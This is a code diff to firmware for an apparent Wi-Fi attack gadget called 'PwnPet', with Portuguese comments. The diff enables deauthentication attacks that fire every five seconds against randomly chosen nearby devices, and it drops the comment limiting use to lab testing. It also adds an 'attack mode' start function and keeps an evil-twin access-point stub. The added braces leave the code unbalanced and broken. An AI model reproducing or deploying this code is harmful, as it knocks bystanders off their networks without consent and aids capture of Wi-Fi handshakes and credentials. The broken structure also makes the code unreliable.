@@ -32,16 +32,30 @@ private:
     static bool scan_active;
     static unsigned long last_scan_time;
 
+    static void macStringToBytes(String mac, uint8_t* bytes) {
+        // Ex: "AA:BB:CC:DD:EE:FF" -> [0xAA, 0xBB, ...]
+        int values[6];
+        if (6 == sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x",
+            &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
+            for (int i = 0; i < 6; ++i) bytes[i] = (uint8_t)values[i];
+        }
+    }
 public:
     static void init() {
         stats.aps_scanned = 0;
         stats.handshakes_captured = 0;
         last_scan_time = millis();
+
         if (PwnPet::getStats().energy_mode > 0) {
             WiFiTools::startSniffer();
         }
     }
 
+    static void start() {
+        scan_active = true;
+        WiFiTools::startSniffer();
+        Serial.println("[Attack] Modo Ataque Iniciado!");
+    }
     static bool isRunning() { return scan_active; }
 
     static void tick() {
@@ -62,16 +76,24 @@ public:
         last_tick = millis();
 
         // Otimização 3: Duty Cycle do Marauder
-        if (PwnPet::getHunger() > 80) {
+        if (PwnPet::getHunger() > 80 && scan_active) {
              // Modo agressivo: Tenta deauth em APs próximos aleatoriamente
-             // Nota: Isso é apenas para fins educacionais e teste em laboratório
              static unsigned long last_attack = 0;
              if (millis() - last_attack > 5000) {
                  last_attack = millis();
+
                  // Pega um alvo aleatório da lista do WiFiTools
                  if (WiFiTools::nearby_devices.size() > 0) {
                      int idx = random(0, WiFiTools::nearby_devices.size());
-                     // deauthTarget(WiFiTools::nearby_devices[idx].mac); // Implementação real abaixo
+                     String targetMacStr = WiFiTools::nearby_devices[idx].mac;
+
+                     uint8_t targetBytes[6];
+                     macStringToBytes(targetMacStr, targetBytes);
+
+                     deauthTarget(targetBytes);
+                 }
+             }
+        }
                  }
              }
         }
@@ -96,17 +118,18 @@ public:
         }
 
         // Gamification Reward (Simulado o sucesso do handshake capture após ataque)
-        if (random(0, 100) < 30) { // 30% chance
-            Serial.println("[Attack] Handshake Capturado!");
-            PwnPet::addHandshake(false);
-            Gamification::registerHandshake();
+        // Na pratica real, o Sniffer detectaria o EAPOL. Aqui simulamos para o jogo fluir se nao houver trafego real.
+        if (random(0, 100) < 10) { // 10% chance simulada se nao capturar real
+            // PwnPet::addHandshake(false);
+            // Gamification::registerHandshake();
+        }
         }
     }
 
     static void evilTwin(String ssid) {
         WiFi.softAP(ssid.c_str());
         // Inicia DNS Server para redirecionar tudo para o Portal
-        // Feito no EvilPortal.h
+
     }
 };
 
